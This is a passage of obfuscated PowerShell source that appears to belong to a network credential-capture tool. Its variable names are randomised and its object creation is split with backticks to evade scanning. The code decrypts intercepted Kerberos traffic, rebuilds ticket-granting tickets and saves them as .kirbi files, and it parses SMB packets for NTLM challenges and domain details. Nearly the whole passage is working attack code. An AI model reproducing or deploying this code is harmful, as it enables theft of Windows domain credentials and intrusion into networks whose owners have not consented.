                4 {[Byte[]]$ToughBaby = 0x72,0xe3,0xf2,0x79,0x3a,0x74,0xa9,0x11,0x5c,0xae,0x57,0x2b,0x95,0x40,0x8a,0xe5 + $GrubbyHusky}
                7 {[Byte[]]$ToughBaby = 0x8b,0x70,0xb8,0xdc,0x6a,0x8d,0xa9,0x1d,0x62,0xb1,0x58,0xac,0x55,0x40,0xeb,0x15 + $GrubbyHusky}
                11 {[Byte[]]$ToughBaby = 0xab,0x80,0xc0,0x60,0xaa,0xaf,0xaa,0x2e,0x6a,0xb5,0x5a,0xad,0x55,0x41,0x6b,0x55 + $GrubbyHusky}
            }

        }

        $MightySpooky = ne`w-`obje`ct "System.Security.Cryptography.AesManaged"
        $MightySpooky.Mode = [System.Security.Cryptography.CipherMode]::CBC
        $MightySpooky.Padding = [System.Security.Cryptography.PaddingMode]::Zeros
        $MightySpooky.IV = 0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00
        $MightySpooky.KeySize = 256
        $MightySpooky.Key = $UtterBang
        $PoisedObese = $MightySpooky.CreateEncryptor()
        $GirlKnotty = $PoisedObese.TransformFinalBlock($ToughBaby,0,$ToughBaby.Length)

        return $GirlKnotty
    }

    function Get-ASN1Length
    {
        param ([Byte[]]$GateNasty)
    
        $ColorReply = 0
    
        while ($GateNasty[$ColorReply] -ne 3 -and $GateNasty[$ColorReply] -ne 129 -and $GateNasty[$ColorReply] -ne 130 -and $GateNasty[$ColorReply] -ne 131 -and $GateNasty[$ColorReply] -ne 132 -and $ColorReply -lt 1)
        {
            $ColorReply++   
        }
    
        switch ($GateNasty[$ColorReply]) 
        {
            
            3
            { 
                $ColorReply += 3 
                $PlaceBook = $GateNasty[$ColorReply]
                $ColorReply++
            }
    
            129
            {
                $ColorReply += 1
                $PlaceBook = $GateNasty[$ColorReply]
                $ColorReply++
            }
    
            130
            {
                $ColorReply += 2
                $PlaceBook = Get-UInt16DataLength 0 $GateNasty[($ColorReply)..($ColorReply - 1)]
                $ColorReply++
            }
    
            131
            {
                $ColorReply += 3
                $PlaceBook = Get-UInt32DataLength 0 ($GateNasty[($ColorReply)..($ColorReply - 2)] + 0x00)
                $ColorReply++
            }
    
            132
            {
                $ColorReply += 4
                $PlaceBook = Get-UInt32DataLength 0 $GateNasty[($ColorReply)..($ColorReply - 3)]
                $ColorReply++
            }
    
        }
    
        return $ColorReply,$PlaceBook
    }

    function Unprotect-HeapDetect
    {
        param([Byte[]]$DollRotten,[Byte[]]$BookFamous)

        $GabbyRoad = [Math]::Truncate($BookFamous.Count % 16)
        [Byte[]]$PartPast = $BookFamous[($BookFamous.Count - $GabbyRoad)..$BookFamous.Count]
        [Byte[]]$TwoPan = $BookFamous[($BookFamous.Count - $GabbyRoad - 16)..($BookFamous.Count - $GabbyRoad - 1)]
        $MightySpooky = ne`w-`obje`ct "System.Security.Cryptography.AesManaged"
        $MightySpooky.Mode = [System.Security.Cryptography.CipherMode]::CBC
        $MightySpooky.Padding = [System.Security.Cryptography.PaddingMode]::Zeros
        $MightySpooky.IV = 0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00
        $MightySpooky.KeySize = 256
        $MightySpooky.Key = $DollRotten
        $ShaveJump = $MightySpooky.CreateDecryptor()
        $ChessFire = $ShaveJump.TransformFinalBlock($TwoPan,0,$TwoPan.Length)
        [Byte[]]$MuddleSudden = $ChessFire[$GabbyRoad..$ChessFire.Count]
        $PartPast += $MuddleSudden
        [Byte[]]$WailMany = $BookFamous[0..($BookFamous.Count - $GabbyRoad - 17)] + $PartPast + $TwoPan
        [Byte[]]$AskEffect = $ShaveJump.TransformFinalBlock($WailMany,0,$WailMany.Length)

        return $AskEffect
    }

    function Get-MiceEnjoy
    {
        param([Byte[]]$JogPowder,[Byte[]]$ChunkyPlay)
    
        [Byte[]]$MiceEnjoy = $JogPowder + $ChunkyPlay
        $MiceEnjoy = 0x30,0x84 + [System.BitConverter]::GetBytes($MiceEnjoy.Count)[3..0] + $MiceEnjoy
        $MiceEnjoy = 0x76,0x84 + [System.BitConverter]::GetBytes($MiceEnjoy.Count)[3..0] + $MiceEnjoy
    
        return $MiceEnjoy
    }
    function Get-KirbiPartTwo
    {
        param([Byte[]]$AskEffect)
    
        $GateNasty = Get-ASN1Length $AskEffect[4..9]
        $TrashyMatch = $GateNasty[0]
        $GateNasty = Get-ASN1Length $AskEffect[($TrashyMatch + 4)..($TrashyMatch + 9)]
        $TrashyMatch += $GateNasty[0]
        $FastGrass = $AskEffect[($TrashyMatch + 7)]
        $CoilTrail = $AskEffect[($TrashyMatch + $FastGrass + 22)]
        $PlanesExcuse = $FastGrass + $CoilTrail
        $GateNasty = Get-ASN1Length $AskEffect[($TrashyMatch + $PlanesExcuse + 74)..($TrashyMatch + $PlanesExcuse + 79)]
        $TrashyMatch += $GateNasty[0]
        $GateNasty = Get-ASN1Length $AskEffect[($TrashyMatch + $PlanesExcuse + 74)..($TrashyMatch + $PlanesExcuse + 79)]
        $TrashyMatch += $GateNasty[0]
        $GateNasty = Get-ASN1Length $AskEffect[($TrashyMatch + $PlanesExcuse + 74)..($TrashyMatch + $PlanesExcuse + 79)]
        $TrashyMatch += $GateNasty[0]
        $KindlyBoring = $AskEffect[($TrashyMatch + $PlanesExcuse + 73)]
        $GateNasty = Get-ASN1Length $AskEffect[($TrashyMatch + $PlanesExcuse + 74)..($TrashyMatch + $PlanesExcuse + 79)]
        $TrashyMatch += $GateNasty[0]
        $GateNasty = Get-ASN1Length $AskEffect[($TrashyMatch + $PlanesExcuse + 74)..($TrashyMatch + $PlanesExcuse + 79)]
        $TrashyMatch += $GateNasty[0]
        $GateNasty = Get-ASN1Length $AskEffect[($TrashyMatch + $PlanesExcuse + 74)..($TrashyMatch + $PlanesExcuse + 79)]
        $TrashyMatch += $GateNasty[0]
        $GateNasty = Get-ASN1Length $AskEffect[($TrashyMatch + $PlanesExcuse + 74)..($TrashyMatch + $PlanesExcuse + 79)]
        $TrashyMatch += $GateNasty[0]
        $GateNasty = Get-ASN1Length $AskEffect[($TrashyMatch + $PlanesExcuse + 74)..($TrashyMatch + $PlanesExcuse + 79)]
        $TrashyMatch += $GateNasty[0]
        $GateNasty = Get-ASN1Length $AskEffect[($TrashyMatch + $PlanesExcuse + 74)..($TrashyMatch + $PlanesExcuse + 79)]
        $TrashyMatch += $GateNasty[0]
        $SilkReach = $AskEffect[($TrashyMatch + $PlanesExcuse + 73)]
        $PopMiss = $AskEffect[($TrashyMatch + $PlanesExcuse + 75)]
        [Byte[]]$UglySpace = $AskEffect[($TrashyMatch + $PlanesExcuse + 76)..($TrashyMatch + $PlanesExcuse + $PopMiss + 75)]
        $PlanesExcuse += $PopMiss
        $DirtVague = $AskEffect[($TrashyMatch + $PlanesExcuse + 88)]
        [Byte[]]$CureScrew = $AskEffect[($TrashyMatch + $PlanesExcuse + 89)..($TrashyMatch + $PlanesExcuse + $DirtVague + 88)]
        $PlanesExcuse += $DirtVague
        $GateNasty = Get-ASN1Length $AskEffect[($TrashyMatch + $PlanesExcuse + 89)..($TrashyMatch + $PlanesExcuse + 94)]
        $TrashyMatch += $GateNasty[0]
        $GateNasty = Get-ASN1Length $AskEffect[($TrashyMatch + $PlanesExcuse + 89)..($TrashyMatch + $PlanesExcuse + 94)]
        $TrashyMatch += $GateNasty[0]
        $GateNasty = Get-ASN1Length $AskEffect[($TrashyMatch + $PlanesExcuse + 89)..($TrashyMatch + $PlanesExcuse + 94)]
        $TrashyMatch += $GateNasty[0]
        $GateNasty = Get-ASN1Length $AskEffect[($TrashyMatch + $PlanesExcuse + 89)..($TrashyMatch + $PlanesExcuse + 94)]
        $TrashyMatch += $GateNasty[0]
        $ReturnWicked = $AskEffect[($TrashyMatch + $PlanesExcuse + 88)]
        $GateNasty = Get-ASN1Length $AskEffect[($TrashyMatch + $PlanesExcuse + 89)..($TrashyMatch + $PlanesExcuse + 94)]
        $TrashyMatch += $GateNasty[0]
        $GateNasty = Get-ASN1Length $AskEffect[($TrashyMatch + $PlanesExcuse + 89)..($TrashyMatch + $PlanesExcuse + 94)]
        $TrashyMatch += $GateNasty[0]
        $RushFog = $GateNasty[1]
        [Byte[]]$SixGrade = $AskEffect[($TrashyMatch + $PlanesExcuse + 89)..($TrashyMatch + $PlanesExcuse + $RushFog + 88)]
        [Byte[]]$MiceEnjoy = 0x04,0x82 + [System.BitConverter]::GetBytes($SixGrade.Count)[1..0] + $SixGrade
        $MiceEnjoy = 0xA2,0x84 + [System.BitConverter]::GetBytes($MiceEnjoy.Count)[3..0] + $MiceEnjoy
        $MiceEnjoy = 0xA0,0x84,0x00,0x00,0x00,0x03,0x02,0x01,0x12,0xA1,0x84,0x00,0x00,0x00,0x03,0x02,0x01 + $ReturnWicked + $MiceEnjoy
        $MiceEnjoy = 0x30,0x84 + [System.BitConverter]::GetBytes($MiceEnjoy.Count)[3..0] + $MiceEnjoy
        $MiceEnjoy = 0xA3,0x84 + [System.BitConverter]::GetBytes($MiceEnjoy.Count)[3..0] + $MiceEnjoy
        [Byte[]]$JogPowder = 0x30,0x84 + [System.BitConverter]::GetBytes($CureScrew.Count)[3..0] + $CureScrew
        $JogPowder = 0xA1,0x84 + [System.BitConverter]::GetBytes($JogPowder.Count)[3..0] + $JogPowder
        $JogPowder = 0xA0,0x84,0x00,0x00,0x00,0x03,0x02,0x01,0x02 + $JogPowder
        $JogPowder = 0x30,0x84 + [System.BitConverter]::GetBytes($JogPowder.Count)[3..0] + $JogPowder
        $JogPowder = 0xA2,0x84 + [System.BitConverter]::GetBytes($JogPowder.Count)[3..0] + $JogPowder
        [Byte[]]$ChunkyPlay = 0xA1,0x84 + [System.BitConverter]::GetBytes($UglySpace.Count)[3..0] + $UglySpace
        $ChunkyPlay = 0xA0,0x84,0x00,0x00,0x00,0x03,0x02,0x01 + $SilkReach + $ChunkyPlay
        [Byte[]]$AuntMale = $ChunkyPlay + $JogPowder + $MiceEnjoy
        $AuntMale = 0x30,0x84 + [System.BitConverter]::GetBytes($AuntMale.Count)[3..0] + $AuntMale
        $AuntMale = 0x61,0x84 + [System.BitConverter]::GetBytes($AuntMale.Count)[3..0] + $AuntMale
        $AuntMale = 0x30,0x84 + [System.BitConverter]::GetBytes($AuntMale.Count)[3..0] + $AuntMale
        $AuntMale = 0xA2,0x84 + [System.BitConverter]::GetBytes($AuntMale.Count)[3..0] + $AuntMale
        $AuntMale = 0xA1,0x84,0x00,0x00,0x00,0x03,0x02,0x01,0x16 + $AuntMale
        $AuntMale = 0xA0,0x84,0x00,0x00,0x00,0x03,0x02,0x01 + $KindlyBoring + $AuntMale
    
        return $AuntMale
    }
    
    function Get-KirbiPartThree
    {
        param([Byte[]]$AskEffect)
    
        $GateNasty = Get-ASN1Length $AskEffect[0..($TrashyMatch + 5)]
        $TrashyMatch = $GateNasty[0]
        $GateNasty = Get-ASN1Length $AskEffect[$TrashyMatch..($TrashyMatch + 5)]
        $TrashyMatch += $GateNasty[0]
        $GateNasty = Get-ASN1Length $AskEffect[$TrashyMatch..($TrashyMatch + 5)]
        $TrashyMatch += $GateNasty[0]
        $GateNasty = Get-ASN1Length $AskEffect[$TrashyMatch..($TrashyMatch + 5)]
        $TrashyMatch += $GateNasty[0]
        $GateNasty = Get-ASN1Length $AskEffect[$TrashyMatch..($TrashyMatch + 5)]
        $TrashyMatch += $GateNasty[0]
        [Byte[]]$PeepSmell = $AskEffect[($TrashyMatch + 11)..($TrashyMatch + 44)]
        $SmokeEarn = $AskEffect[($TrashyMatch + 46)]
        [Byte[]]$FalseCoil = $AskEffect[($TrashyMatch + 47)..($TrashyMatch + $SmokeEarn + 46)]
        $SnailEarn = $AskEffect[($TrashyMatch + $SmokeEarn + 59)]
        $PlanesExcuse = $SmokeEarn + $SnailEarn
        [Byte[]]$WristDrag = $AskEffect[($TrashyMatch + $SmokeEarn + 60)..($TrashyMatch + $PlanesExcuse + 59)]
        [Byte[]]$NimbleReport = $AskEffect[($TrashyMatch + $PlanesExcuse + 65)..($TrashyMatch + $PlanesExcuse + 68)]
        [Byte[]]$TugIll = $AskEffect[($TrashyMatch + $PlanesExcuse + 71)..($TrashyMatch + $PlanesExcuse + 87)]
        [Byte[]]$CreepySmoke = $AskEffect[($TrashyMatch + $PlanesExcuse + 90)..($TrashyMatch + $PlanesExcuse + 106)]
        [Byte[]]$OrderBury = $AskEffect[($TrashyMatch + $PlanesExcuse + 109)..($TrashyMatch + $PlanesExcuse + 125)]
        $MuteTricky = $AskEffect[($TrashyMatch + $PlanesExcuse + 127)]
        [Byte[]]$UnablePan = $AskEffect[($TrashyMatch + $PlanesExcuse + 128)..($TrashyMatch + $PlanesExcuse + $MuteTricky + 127)]
        $PlanesExcuse += $MuteTricky
        $DirtVague = $AskEffect[($TrashyMatch + $PlanesExcuse + 140)]
        [Byte[]]$CureScrew = $AskEffect[($TrashyMatch + $PlanesExcuse + 141)..($TrashyMatch + $PlanesExcuse + $DirtVague + 140)]
        [Byte[]]$MiceEnjoy = 0x30,0x84 + [System.BitConverter]::GetBytes($CureScrew.Count)[3..0] + $CureScrew
        $MiceEnjoy = 0xA1,0x84 + [System.BitConverter]::GetBytes($MiceEnjoy.Count)[3..0] + $MiceEnjoy
        $MiceEnjoy = 0xA0,0x84,0x00,0x00,0x00,0x03,0x02,0x01,0x02 + $MiceEnjoy
        $MiceEnjoy = 0x30,0x84 + [System.BitConverter]::GetBytes($MiceEnjoy.Count)[3..0] + $MiceEnjoy
        $MiceEnjoy = 0xA9,0x84 + [System.BitConverter]::GetBytes($MiceEnjoy.Count)[3..0] + $MiceEnjoy
        $MiceEnjoy = 0xA8,0x84 + [System.BitConverter]::GetBytes($UnablePan.Count)[3..0] + $UnablePan + $MiceEnjoy
        $MiceEnjoy = 0xA7,0x84 + [System.BitConverter]::GetBytes($OrderBury.Count)[3..0] + $OrderBury + $MiceEnjoy
        $MiceEnjoy = 0xA6,0x84 + [System.BitConverter]::GetBytes($CreepySmoke.Count)[3..0] + $CreepySmoke + $MiceEnjoy
        $MiceEnjoy = 0xA5,0x84 + [System.BitConverter]::GetBytes($TugIll.Count)[3..0] + $TugIll + $MiceEnjoy
        $MiceEnjoy = 0xA3,0x84,0x00,0x00,0x00,0x07,0x03,0x05,0x00 + $NimbleReport + $MiceEnjoy
        [Byte[]]$JogPowder = 0x30,0x84 + [System.BitConverter]::GetBytes($WristDrag.Count)[3..0] + $WristDrag
        $JogPowder = 0xA1,0x84 + [System.BitConverter]::GetBytes($JogPowder.Count)[3..0] + $JogPowder
        $JogPowder = 0xA0,0x84,0x00,0x00,0x00,0x03,0x02,0x01,0x01 + $JogPowder
        $JogPowder = 0x30,0x84 + [System.BitConverter]::GetBytes($JogPowder.Count)[3..0] + $JogPowder
        $JogPowder = 0xA2,0x84 + [System.BitConverter]::GetBytes($JogPowder.Count)[3..0] + $JogPowder
        $JogPowder = 0xA1,0x84 + [System.BitConverter]::GetBytes($FalseCoil.Count)[3..0] + $FalseCoil + $JogPowder
        [Byte[]]$ChunkyPlay = 0xA1,0x84 + [System.BitConverter]::GetBytes($PeepSmell.Count)[3..0] + $PeepSmell
        $ChunkyPlay = 0xA0,0x84,0x00,0x00,0x00,0x03,0x02,0x01,0x12 + $ChunkyPlay
        $ChunkyPlay = 0x30,0x84 + [System.BitConverter]::GetBytes($ChunkyPlay.Count)[3..0] + $ChunkyPlay
        $ChunkyPlay = 0xA0,0x84 + [System.BitConverter]::GetBytes($ChunkyPlay.Count)[3..0] + $ChunkyPlay
        [Byte[]]$AuntMale = $ChunkyPlay + $JogPowder + $MiceEnjoy
        $AuntMale = 0x30,0x84 + [System.BitConverter]::GetBytes($AuntMale.Count)[3..0] + $AuntMale
        $AuntMale = 0x30,0x84 + [System.BitConverter]::GetBytes($AuntMale.Count)[3..0] + $AuntMale
        $AuntMale = 0xA0,0x84 + [System.BitConverter]::GetBytes($AuntMale.Count)[3..0] + $AuntMale
        $AuntMale = 0x30,0x84 + [System.BitConverter]::GetBytes($AuntMale.Count)[3..0] + $AuntMale
        $AuntMale = 0x7D,0x84 + [System.BitConverter]::GetBytes($AuntMale.Count)[3..0] + $AuntMale
        $AuntMale = 0x04,0x82 + [System.BitConverter]::GetBytes($AuntMale.Count)[1..0] + $AuntMale
        $AuntMale = 0xA2,0x84 + [System.BitConverter]::GetBytes($AuntMale.Count)[3..0] + $AuntMale
        $AuntMale = 0xA0,0x84,0x00,0x00,0x00,0x03,0x02,0x01,0x00 + $AuntMale
        $AuntMale = 0x30,0x84 + [System.BitConverter]::GetBytes($AuntMale.count)[3..0] + $AuntMale
        $AuntMale = 0xA3,0x84 + [System.BitConverter]::GetBytes($AuntMale.count)[3..0] + $AuntMale
    
        return $AuntMale
    }

    function New-KerberosKirbi
    {
        param([Byte[]]$IckyBloody,[Byte[]]$UtterBang,[String]$NeedyArt,[String]$BlowAware,[String]$RejectFast)

        $CloudyDreary = [System.BitConverter]::ToString($IckyBloody)
        $CloudyDreary = $CloudyDreary -replace "-",""
        $SongsStir = $CloudyDreary.IndexOf("A003020112A1030201")

        if($SongsStir -ge 0)
        {
            $GateNasty = Get-ASN1Length $IckyBloody[($SongsStir / 2 + 10)..($SongsStir / 2 + 15)]
            $TrashyMatch = $GateNasty[0]
            $GateNasty = Get-ASN1Length $IckyBloody[($SongsStir / 2 + $TrashyMatch + 10)..($SongsStir / 2 + $TrashyMatch + 15)]
            $TrashyMatch += $GateNasty[0]
            $RushFog = $GateNasty[1]
            [Byte[]]$SixGrade = $IckyBloody[($SongsStir / 2 + $TrashyMatch + 10)..($SongsStir / 2 + $TrashyMatch + $RushFog + 9)]
            [Byte[]]$DollRotten = Get-KerberosAES256UsageKey encrypt 2 $UtterBang
            [Byte[]]$AskEffect = Unprotect-HeapDetect $DollRotten $SixGrade[0..($SixGrade.Count - 13)]
            $AskEffect = $AskEffect[16..$AskEffect.Count]
            $SideBike = [System.BitConverter]::ToString($AskEffect)
            $SideBike = $SideBike -replace "-",""
            $SongsStir = $SideBike.IndexOf("A003020112A1")

            if($SongsStir -ge 0)
            {
                [Byte[]]$RoofExtend = $AskEffect[30..61]
                [Byte[]]$DollRotten = Get-KerberosAES256UsageKey encrypt 11 $RoofExtend
                $SongsStir = $CloudyDreary.IndexOf("A003020112A2")

                if($SongsStir -ge 0)
                {
                    $GateNasty = Get-ASN1Length $IckyBloody[($SongsStir / 2 + 5)..($SongsStir / 2 + 10)]
                    $TrashyMatch = $GateNasty[0]
                    $GateNasty = Get-ASN1Length $IckyBloody[($SongsStir / 2 + $TrashyMatch + 5)..($SongsStir / 2 + $TrashyMatch + 10)]
                    $TrashyMatch += $GateNasty[0]
                    $RushFog = $GateNasty[1]
                    [Byte[]]$SixGrade = $IckyBloody[($SongsStir / 2 + $TrashyMatch + 5)..($SongsStir / 2 + $TrashyMatch + $RushFog + 4)]
                    [Byte[]]$AskEffect = Unprotect-HeapDetect $DollRotten $SixGrade[0..($SixGrade.Count - 13)]
                    [Byte[]]$DollRotten = Get-KerberosAES256UsageKey encrypt 14 $RoofExtend
                    $AskEffect = $AskEffect[16..$AskEffect.Count]
                    [Byte[]]$JogPowder = Get-KirbiPartTwo $AskEffect
                    $GateNasty = Get-ASN1Length $AskEffect[4..9]
                    $TrashyMatch = $GateNasty[0]
                    $GateNasty = Get-ASN1Length $AskEffect[($TrashyMatch + 4)..($TrashyMatch + 9)]
                    $TrashyMatch += $GateNasty[0]
                    $FastGrass = $AskEffect[($TrashyMatch + 7)]
                    $JoyousFound = Convert-DataToString 0 $FastGrass $AskEffect[($TrashyMatch + 8)..($TrashyMatch + $FastGrass + 7)]
                    $CoilTrail = $AskEffect[($TrashyMatch + $FastGrass + 22)]
                    $StuffDark = Convert-DataToString 0 $CoilTrail $AskEffect[($TrashyMatch + $FastGrass + 23)..($TrashyMatch + $FastGrass + $CoilTrail + 22)]
                    $SideBike = [System.BitConverter]::ToString($AskEffect)
                    $SideBike = $SideBike -replace "-",""
                    $SongsStir = $SideBike.IndexOf("A003020112A2")

                    if($SongsStir -ge 0)
                    {
                        $GateNasty = Get-ASN1Length $AskEffect[($SongsStir / 2 + 5)..($SongsStir / 2 + 10)]
                        $TrashyMatch = $GateNasty[0]
                        $GateNasty = Get-ASN1Length $AskEffect[($SongsStir / 2 + $TrashyMatch + 5)..($SongsStir / 2 + $TrashyMatch + 10)]
                        $TrashyMatch += $GateNasty[0]
                        $RushFog = $GateNasty[1]
                        [Byte[]]$SixGrade = $AskEffect[($SongsStir / 2 + $TrashyMatch + 5)..($SongsStir / 2 + $TrashyMatch + $RushFog + 4)]
                        [Byte[]]$AskEffect = Unprotect-HeapDetect $DollRotten $SixGrade[0..($SixGrade.Count - 13)]
                        $AskEffect = $AskEffect[16..$AskEffect.Count]
                        [Byte[]]$ChunkyPlay = Get-KirbiPartThree $AskEffect
                        [Byte[]]$MiceEnjoy = Get-MiceEnjoy $JogPowder $ChunkyPlay

                        if($StuffDark -notmatch '[^\x00-\x7F]+' -and $JoyousFound -notmatch '[^\x00-\x7F]+')
                        {
                            $LightOval.output_queue.Add("[+] [$(Get-Date -format s)] $NeedyArt($BlowAware) Kerberos TGT captured for $StuffDark@$JoyousFound from $RejectFast") > $null   
                            $LightOval.kerberos_TGT_list.Add($MiceEnjoy) > $null
                            $LightOval.kerberos_TGT_username_list.Add("$StuffSky $StuffDark $JoyousFound $($LightOval.kerberos_TGT_list.Count - 1)") > $null
                            $TraceRare = ($LightOval.kerberos_TGT_username_list -like "* $StuffDark $JoyousFound *").Count
                        }

                        if($TraceRare -le $KindLick)
                        {

                            try
                            {
                                $MoonAboard = $SilkySmelly + "\$StuffDark@$JoyousFound-TGT-$(Get-Date -format MMddhhmmssffff).kirbi"
                                $SpoonWood = ne`w-`obje`ct System.IO.FileStream $MoonAboard,'Append','Write','Read'
                                $SpoonWood.Write($MiceEnjoy,0,$MiceEnjoy.Count)
                                $SpoonWood.close()
                                $LightOval.output_queue.Add("[!] [$(Get-Date -format s)] $NeedyArt($BlowAware) Kerberos TGT for $StuffDark@$JoyousFound written to $MoonAboard") > $null
                            }
                            catch
                            {
                                $error_message = $_.Exception.Message
                                $error_message = $error_message -replace "`n",""
                                $LightOval.output_queue.Add("[!] [$(Get-Date -format s)] $error_message $($_.InvocationInfo.Line.Trim())") > $null
                            }

                        }

                    }
                    else
                    {
                        $LightOval.output_queue.Add("[-] [$(Get-Date -format s)] $NeedyArt($BlowAware) Kerberos TGT not found from $RejectFast") > $null    
                    }

                }
                else
                {
                    $LightOval.output_queue.Add("[-] [$(Get-Date -format s)] $NeedyArt($BlowAware) Kerberos autenticator not found from $SackUpbeat") > $null    
                }

            }
            else
            {
                $LightOval.output_queue.Add("[-] [$(Get-Date -format s)] $NeedyArt($BlowAware) Kerberos failed to decrypt capture from $RejectFast") > $null    
            }

        }
        else
        {
            
            if($CloudyDreary -like "*A0030201??A1030201*")
            {

                if($CloudyDreary -like "*A003020111A1030201*")
                {
                    $EmptyAbsurd = "AES128-CTS-HMAC-SHA1-96"
                }
                elseif($CloudyDreary -like "*A003020117A1030201*")
                {
                    $EmptyAbsurd = "RC4-HMAC"
                }
                elseif($CloudyDreary -like "*A003020118A1030201*")
                {
                    $EmptyAbsurd = "RC4-HMAC-EXP"
                }
                elseif($CloudyDreary -like "*A003020103A1030201*")
                {
                    $EmptyAbsurd = "DES-CBC-MD5"
                }
                elseif($CloudyDreary -like "*A003020101A1030201*")
                {
                    $EmptyAbsurd = "DES-CBC-CRC"
                }

                $LightOval.output_queue.Add("[-] [$(Get-Date -format s)] $NeedyArt($BlowAware) Kerberos unsupported encryption type $EmptyAbsurd from $RejectFast") > $null
            }
            else
            {
                $LightOval.output_queue.Add("[-] [$(Get-Date -format s)] $NeedyArt($BlowAware) Kerberos failed to extract AS-REQ from $RejectFast") > $null 
            }
               
        }

    }

}

# Microsoft".
$SuckFaded =
{
    
    function Get-SMBConnection
    {
        param ([Byte[]]$MuscleRatty,[String]$DesignArrest,[String]$RiddlePizzas,[String]$ChurchSteep,[String]$HollowThick,[String]$FarGrowth)

        $BabyVoice = [System.BitConverter]::ToString($MuscleRatty)
        $BabyVoice = $BabyVoice -replace "-",""
        $RejectFast = "$RiddlePizzas`:$HollowThick"
        $ThinWoozy = "$ChurchSteep`:$FarGrowth"
        $HeavyHop = $BabyVoice.IndexOf("FF534D42")

        if(!$LightOval.SMB_session_table.ContainsKey($RejectFast) -and $HeavyHop -gt 0 -and $BabyVoice.SubString(($HeavyHop + 8),2) -eq "72" -and $RiddlePizzas -ne $DesignArrest)
        {
            $LightOval.output_queue.Add("[+] [$(Get-Date -format s)] SMB($FarGrowth) negotiation request detected from $RejectFast") > $null
        }
        elseif(!$LightOval.SMB_session_table.ContainsKey($RejectFast) -and $HeavyHop -gt 0 -and $BabyVoice.SubString(($HeavyHop + 8),2) -eq "72" -and $RiddlePizzas -eq $DesignArrest)
        {
            $LightOval.output_queue.Add("[+] [$(Get-Date -format s)] SMB($HollowThick) outgoing negotiation request detected to $ThinWoozy") > $null
        }

        if(!$LightOval.SMB_session_table.ContainsKey($RejectFast) -and $HeavyHop -gt 0)
        {
            $LightOval.SMB_session_table.Add($RejectFast,"")
        }

        $HeavyHop = $BabyVoice.IndexOf("FE534D42")

        if(!$LightOval.SMB_session_table.ContainsKey($RejectFast) -and $HeavyHop -gt 0 -and $BabyVoice.SubString(($HeavyHop + 24),4) -eq "0000" -and $RiddlePizzas -ne $DesignArrest)
        {
            $LightOval.output_queue.Add("[+] [$(Get-Date -format s)] SMB($FarGrowth) negotiation request detected from $RejectFast") > $null
        }
        elseif(!$LightOval.SMB_session_table.ContainsKey($RejectFast) -and $HeavyHop -gt 0 -and $BabyVoice.SubString(($HeavyHop + 24),4) -eq "0000" -and $RiddlePizzas -eq $DesignArrest)
        {
            $LightOval.output_queue.Add("[+] [$(Get-Date -format s)] SMB($HollowThick) outgoing negotiation request detected to $ThinWoozy") > $null
        }

        if(!$LightOval.SMB_session_table.ContainsKey($RejectFast) -and $HeavyHop -gt 0)
        {
            $LightOval.SMB_session_table.Add($RejectFast,"")
        }

        $HeavyHop = $BabyVoice.IndexOf("2A864886F7120102020100")

        if($HeavyHop -gt 0 -and $RiddlePizzas -ne $DesignArrest)
        {
            $LightOval.output_queue.Add("[+] [$(Get-Date -format s)] SMB($FarGrowth) authentication method is Kerberos for $RejectFast") > $null

            if($HeapDetect -eq 'Y')
            {
                $RateBabies = Get-UInt16DataLength 0 $MuscleRatty[82..83]
                $RateBabies -= $HeavyHop / 2
                $RemindHammer = $MuscleRatty[($HeavyHop/2)..($HeavyHop/2 + $MuscleRatty.Count)]
            }

        }
        elseif($HeavyHop -gt 0 -and $RiddlePizzas -eq $DesignArrest)
        {
            $LightOval.output_queue.Add("[+] [$(Get-Date -format s)] SMB($HollowThick) outgoing authentication method is Kerberos to $ThinWoozy") > $null

            if($HeapDetect -eq 'Y')
            {
                $RateBabies = Get-UInt16DataLength 0 $MuscleRatty[82..83]
                $RateBabies -= $HeavyHop / 2
                $RemindHammer = $MuscleRatty[($HeavyHop/2)..($HeavyHop/2 + $MuscleRatty.Count)]
            }

        }

        return $RateBabies,$RemindHammer
    }

    function Get-SMBNTLMChallenge
    {
        param ([Byte[]]$MuscleRatty)

        $BabyVoice = [System.BitConverter]::ToString($MuscleRatty)
        $BabyVoice = $BabyVoice -replace "-",""
        $AwarePick = $BabyVoice.IndexOf("4E544C4D53535000")

        if($AwarePick -gt 0)
        {

            if($BabyVoice.SubString(($AwarePick + 16),8) -eq "02000000")
            {
                $EggsExist = $BabyVoice.SubString(($AwarePick + 48),16)
            }

            $EasyTested = Get-UInt16DataLength (($AwarePick + 24) / 2) $MuscleRatty
            $RaggedMessy = [System.Convert]::ToInt16(($BabyVoice.SubString(($AwarePick + 44),2)),16)
            $RaggedMessy = [Convert]::ToString($RaggedMessy,2)
            $GrayKneel = $RaggedMessy.SubString(0,1)

            if($GrayKneel -eq 1)
            {
                $RollGreat = ($AwarePick + 80) / 2
                $RollGreat = $RollGreat + $EasyTested + 16
                $RaggedMemory = $MuscleRatty[$RollGreat]
                $ColorReply = 0

                while($RaggedMemory -ne 0 -and $ColorReply -lt 10)
                {
                    $SisterWriter = Get-UInt16DataLength ($RollGreat + 2) $MuscleRatty

                    switch($RaggedMemory) 
                    {

                        2
                        {
                            $WrongCub = Convert-DataToString ($RollGreat + 4) $SisterWriter $MuscleRatty
                        }

                        3
                        {
                            $SleepyMinute = Convert-DataToString ($RollGreat + 4) $SisterWriter $MuscleRatty
                        }

                        4
                        {
                            $ArtMessy = Convert-DataToString ($RollGreat + 4) $SisterWriter $MuscleRatty
                        }

                    }

                    $RollGreat = $RollGreat + $SisterWriter + 4
                    $RaggedMemory = $MuscleRatty[$RollGreat]
                    $ColorReply++
                }

                if($WrongCub -and $ArtMessy -and !$LightOval.domain_mapping_table.$WrongCub -and $WrongCub -ne $ArtMessy)
                {
                    $LightOval.domain_mapping_table.Add($WrongCub,$ArtMessy)
                    $LightOval.output_queue.Add("[+] [$(Get-Date -format s)] Domain mapping added for $WrongCub to $ArtMessy") > $null
                }

                for($ColorReply = 0;$ColorReply -lt $LightOval.enumerate.Count;$ColorReply++)
                {

                    if($LightOval.enumerate[$ColorReply].IP -eq $DogSuffer -and !$LightOval.enumerate[$ColorReply].Hostname)
                    {
                        $LightOval.enumerate[$ColorReply].Hostname = $SleepyMinute
                        $LightOval.enumerate[$ColorReply]."DNS Domain" = $ArtMessy
                        $LightOval.enumerate[$ColorReply]."netBIOS Domain" = $WrongCub
                        break
                    }

                }

            }

        }

        return $EggsExist
